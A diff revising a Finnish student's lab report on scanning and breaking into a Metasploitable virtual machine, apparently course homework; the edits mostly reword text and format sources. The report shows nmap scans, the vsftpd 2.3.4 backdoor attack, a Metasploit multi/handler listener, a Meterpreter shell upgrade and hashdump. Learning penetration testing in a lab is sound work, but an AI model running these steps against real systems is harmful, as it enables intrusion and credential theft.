@@ -42,7 +42,9 @@ Aliverkko `192.168.82.0/24` skannattiin ja lopputuloksena 256 IP-osoitteesta vai
 
 _Metasploitablen IP-osoite hakukoneessa._
 
-Seuraavaksi skannasin Metasploitablen perusteellisesti ja tallensin tiedot tarkasteltavaksi. Tämä järjestyy komennolla `db_nmap -A -p- 192.168.82.3` josta `db_` osio tallentaa tulosteen Metasploitablen tietokantoihin ja `-A -p-` spesifoi haun olevan kattava ja koskevan kaikkia portteja. Tämän jälkeen voin käyttää milloin vaan komentoja `hosts` ja `services` skannauksen tuloksien tarkastelua varten. Voin myös suodattaa näistä tuloksista tietoja. Metasploitable ei tunnu tykkäävän merkistä `|`, joten käytin komentoa `services -S apache` suodattaakseni vain apacheen liittyvät tulokset.
+Seuraavaksi skannasin Metasploitablen perusteellisesti ja tallensin tiedot tarkasteltavaksi. Tämä järjestyy komennolla `db_nmap -A -p- 192.168.82.3` josta `db_` osio tallentaa tulosteen Metasploitablen tietokantoihin ja `-A -p-` spesifoi haun olevan kattava ja koskevan kaikkia portteja. 
+
+Tämän jälkeen voin käyttää milloin vaan komentoja `hosts` ja `services` skannauksen tuloksien tarkastelua varten. Voin myös suodattaa näistä tuloksista tietoja. Metasploitable ei tunnu tykkäävän merkistä `|`, joten käytin komentoa `services -S apache` suodattaakseni vain apacheen liittyvät tulokset.
 
 ![image](https://github.com/user-attachments/assets/80d91c19-1abd-409f-8a49-63f64ae7d25c)
 
@@ -52,11 +54,15 @@ _Porttiskannauksen tulosten tarkastelu jälkeenpäin_
 
 _Porttiskannauksen tulosten suodattaminen_
 
-Käytin tämän keinon lisäksi myös komentoa `nmap -A -p- -oA scan_result 192.168.82.3`, joka tallentaa samat tiedot kolmeen eri tiedostoon; `scan_result.nmap`, `scan_result.xml` ja `scan_result.gnmap`. Näistä `.nmap` on nmap tuloste skannauksesta, `.xml` sama tuloste `XML` muodossa ja `.gnmap` on helposti `grep`-komennolla haettava tiedosto.
+Käytin tämän keinon lisäksi myös komentoa `nmap -A -p- -oA scan_result 192.168.82.3`, joka tallentaa samat tiedot kolmeen eri tiedostoon; 
 
-Näistä skannaustulosteista `db_nmap` on hyvä ja nopea saada Metasploitablen konsoliin tarvittavat tiedot jatkotoimia varten. `nmap -oA` sen sijaan antoi monimuotoisemman tulosteen, jota voi olla helpompi hyödyntää esim. työkaluissa ja skriptaamisessa. Käytin itse mielummin `db_nmap`-tulostetta sen käyttöhelppouden vuoksi kunnes tarvitsin tarkempaa tietoa tai tietoa helpommasti tulkittavassa muodossa.
+`scan_result.nmap`, `scan_result.xml` ja `scan_result.gnmap`. Näistä `.nmap` on nmap tuloste skannauksesta, `.xml` sama tuloste `XML` muodossa ja `.gnmap` on helposti `grep`-komennolla haettava tiedosto.
+
+Näistä skannaustulosteista `db_nmap` on hyvä ja nopea tapa saada Metasploitablen konsoliin tarvittavat tiedot jatkotoimia varten. `nmap -oA` sen sijaan antoi monimuotoisemman tulosteen, jota voi olla helpompi hyödyntää esim. työkaluissa ja skriptaamisessa. Käytin itse mielummin `db_nmap`-tulostetta sen käyttöhelppouden vuoksi kunnes tarvitsin tarkempaa tietoa tai tietoa helpommasti tulkittavassa muodossa.
 
 ### Lähteet
+
+Offsec: Port-scanning. Luettavissa: https://www.offsec.com/metasploit-unleashed/port-scanning/. Luettu 6.11.2024.
 
 ## Tunkeutuminen (kohdat G-N)
 
@@ -66,7 +72,7 @@ Seuraavaksi kokeilin murtautua Metasploitableen käyttäen takaovea portissa 21 
 
 _Onnistunut vsftpd hyökkäys_
 
-Onnistuneen hyökkäyksen jälkeen aloin valmistelemaan Meterpreteriä, jotta voisin kerätä levittämiseen tarvittavaa tietoa tehokkaasti. Aluksi asetin `vsftpd`-yhteyden taustalle komennolla `background` ja suoritin Meterpreter-yhteyden luomisen seuraavalla komentosarjalla;
+Onnistuneen hyökkäyksen jälkeen aloin valmistelemaan Meterpreteriä, jotta voisin kerätä levittämiseen tarvittavaa tietoa tehokkaasti. Aluksi asetin `vsftpd`-yhteyden taustalle komennolla `background` ja suoritin Meterpreterin konfiguroimisen seuraavalla komentosarjalla;
 
 ```
 use exploit/multi/handler
@@ -76,7 +82,7 @@ set LPORT 4443
 exploit -j
 ```
 
-Tämä komentopätkä kertoi Meterpreterille tärkeät tiedot kohteesta sekä omasta koneestani. Tämän jälkeen voin päivättää nykyisen yhteyden `sessions 1` komennolla `sessions -u 1` ja täten saada Meterpreter toimimaan `vsftpd`-shellissä komennolla `sessions -i 2`
+Tämä komentopätkä luo multi-handlerin, joka kuuntelee spesifikoituen yhteyksien varalta. Tämän avulla voin päivittää nykyisen yhteyden `sessions 1` komennolla `sessions -u 1` ja täten saada Meterpreter toimimaan `vsftpd`-shellissä komennolla `sessions -i 2`
 
 ![image](https://github.com/user-attachments/assets/19638edd-d664-4ea4-9c94-377d808ce815)
 
@@ -126,15 +132,17 @@ Kokeilin vielä joitain Meterpreterin komentoja kuten `getsystem` ja `hashdump`.
 
 Tallensin lopuksi login tekstitiedostoon `log001.txt` komennolla  `script -fa log001.txt`. Tämä täytyi tehdä ennen msfconsoleen astumista, sillä siellä ei voi suorittaa kaikkia komentoja. `cat` komennolla sain täyden listan tehdyistä komennoista session lopuksi.
 
+En tällä viikolla ehtinyt tehdä vapaaehtoisia tehtäviä, mutta saatan vielä palata niihin.
+
 ### Lähteet
 
-https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
+Rapid7: VSFTPD v2.3.4 Backdoor Command Execution. Luettavissa: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/ Luettu: 6.11.2024
 
-https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html
+ComputerSecurityStudent: Metasploitable Project: Lesson 2. Luettavissa: https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html Luettu: 6.11.2024
 
-https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/
+Rapid7: Use Meterpreter Locally Without An Exploit. Luettavissa: https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/. Luettu: 6.11.2024
 
-https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
+Offsec: Meterpreter Basics. Luettavissa: https://www.offsec.com/metasploit-unleashed/meterpreter-basics/. Luettu: 6.11.2024
 
 ## Yleiset lähteet
 
